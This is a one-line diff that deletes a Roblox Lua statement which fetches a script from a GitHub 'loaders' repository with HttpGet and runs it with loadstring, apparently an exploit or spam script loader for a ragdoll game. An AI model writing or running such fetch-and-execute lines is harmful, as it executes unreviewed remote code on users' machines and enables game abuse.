@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Frontierpifurnace41/loaders/main/loaders/realistic-ragdoll-engine-spam3-66dvm6olnl47fk.lua"))()
